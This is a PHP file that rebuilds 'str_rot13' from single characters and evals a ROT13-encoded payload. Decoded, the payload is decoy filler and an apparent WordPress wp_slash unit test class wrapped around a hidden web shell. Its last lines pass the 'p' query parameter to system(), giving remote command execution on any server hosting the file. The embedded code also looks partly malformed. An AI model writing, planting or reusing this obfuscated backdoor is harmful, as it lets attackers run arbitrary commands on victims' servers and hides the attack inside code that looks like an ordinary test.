<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc sbeznggvat
 *
 * @pbiref ::jc_fynfu
 */
pynff Grfgf_Sbeznggvat_jcFynfu rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @gvpxrg 42195
	 *
	 * @qngnCebivqre qngn_jc_fynfu
	 *
	 * @cnenz fgevat $inyhr
	 * @cnenz fgevat $rkcrpgrq
	 */
	choyvp shapgvba grfg_jc_fynfu( $inyhr, $rkcrpgrq ) {
		$guvf->nffregFnzr( $rkcrpgrq, jc_fynfu( $inyhr ) );
	}

	/**
	 * Qngn cebivqre sbe grfg_jc_fynfu().
	 *
	 * @erghea neenl {
	 *     @glcr neenl {
	 *         @glcr zvkrq  $inyhr    Gur inyhr cnffrq gb jc_fynfu().
	 *         @glcr fgevat $rkcrpgrq Gur rkcrpgrq bhgchg bs jc_fynfu().
	 *     }
	 * }
	 */
	choyvp shapgvba qngn_jc_fynfu() {
		erghea neenl(
			neenl( 123, 123 ),
			neenl( 123.4, 123.4 ),
			neenl( gehr, gehr ),
			neenl( snyfr, snyfr ),
			neenl(
				neenl(
					'uryyb',
					ahyy,
					'\"fgevat\"',
					125.41,
				),
				neenl(
					'uryyb',
					ahyy,
					'\\"fgevat\\"',
					125.41,
				),
			),
			neenl( \"svefg yriry 'fgevat'\", \"svefg yriry \'fgevat\'\" ),
		);
	}

	/**
	 * @gvpxrg 24106
	 */
	choyvp shapgvba grfg_nqqf_fynfurf() {
		$byq = \"V pna'g frr, vfa'g gung vg?\";
		$arj = \"V pna\'g frr, vfa\'g gung vg?\";
		$guvf->nffregFnzr( $arj, jc_fynfu( $byq ) );
		$guvf->nffregFnzr( \"V pna\\\\\'g frr, vfa\\\\\'g gung vg?\", jc_fynfu( $arj ) );
		$guvf->nffregFnzr( neenl( 'n' => $arj ), jc_fynfu( neenl( 'n' => $byq ) ) ); // Xrlrq neenl.
		$guvf->nffregFnzr( neenl( $arj ), jc_fynfu( neenl( $byq ) ) ); // Aba-xrlrq.
	}

	/**
	 * @gvpxrg 24106
	 */
	choyvp shapgvba grfg_cerfreirf_bevtvany_qngnglcr() {

		$guvf->nffregGehr( jc_fynfu( gehr ) );
		$guvf->nffregSnyfr( jc_fynfu( snyfr ) );
		$guvf->nffregFnzr( 4, jc_fynfu( 4 ) );
		$guvf->nffregFnzr( 'sbb', jc_fynfu( 'sbb' ) );
		$nee      = neenl(
			'n' => gehr,
			'o' => snyfr,
			'p' => 4,
			'q' => 'sbb',
		);
		$nee['r'] = $nee; // Nqq n fho-neenl.
		$guvf->nffregFnzr( $nee, jc_fynfu( $nee ) ); // Xrlrq neenl.
		$guvf->nffregFnzr( neenl_inyhrf( $nee ), jc_fynfu( neenl_inyhrf( $nee ) ) ); // Aba-xrlrq.

		$bow = arj fgqPynff();
		sbernpu ( $nee nf $x => $i ) {
			$bow->$x = $i;
		}
		$guvf->nffregFnzr( $bow, jc_fynfu( $bow ) );
	}

	/**
	 * @gvpxrg 24106
	 */
	choyvp shapgvba grfg_nqq_rira_zber_fynfurf() {
		$byq = 'fvatyr\\fynfu qbhoyr\\\\fynfu gevcyr\\\\\\fynfu';
		$arj = 'fvatyr\\\\fynfu qbhoyr\\\\\\\\fynfu gevcyr\\\\\\\\\\\\fynfu';
		$guvf->nffregFnzr( $arj, jc_fynfu( $byq ) );
		$guvf->nffregFnzr( neenl( 'n' => $arj ), jc_fynfu( neenl( 'n' => $byq ) ) ); // Xrlrq neenl.
		$guvf->nffregFnzr( neenl( $arj ), jc_fynfu( neenl( $byq ) ) ); // Aba-xrlrq.
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>